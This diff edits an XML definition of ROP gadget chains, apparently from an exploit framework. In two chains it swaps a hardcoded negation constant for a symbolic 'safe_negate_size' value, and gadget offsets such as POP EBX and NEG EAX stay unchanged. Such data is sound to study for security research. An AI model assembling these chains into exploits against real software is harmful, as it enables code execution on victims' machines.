@@ -11,7 +11,7 @@
 		<gadget offset="0x0001803c">POP EBP # RETN</gadget>
 		<gadget offset="0x0001803c">skip 4 bytes</gadget>
 		<gadget offset="0x0001750f">POP EBX # RETN</gadget>
-		<gadget value="fffffdff">0x00000201</gadget>
+		<gadget value="safe_negate_size">Safe size to NEG</gadget>
 		<gadget offset="0x00005737">XCHG EAX, EBX # RETN</gadget>
 		<gadget offset="0x0004df88">NEG EAX # RETN</gadget>
 		<gadget offset="0x00005737">XCHG EAX, EBX # RETN</gadget>
@@ -40,7 +40,7 @@
 		<gadget offset="0x0003e4fa">POP EBP # RETN</gadget>
 		<gadget offset="0x0003e4fa">skip 4 bytes</gadget>
 		<gadget offset="0x0006a2b4">POP EBX # RETN</gadget>
-		<gadget value="fffffdff">0x00000201</gadget>
+		<gadget value="safe_negate_size">Safe size to NEG</gadget>
 		<gadget offset="0x00069351">XCHG EAX, EBX # RETN</gadget>
 		<gadget offset="0x00025188">NEG EAX # POP ESI # RETN</gadget>
 		<gadget value="junk">JUNK</gadget>
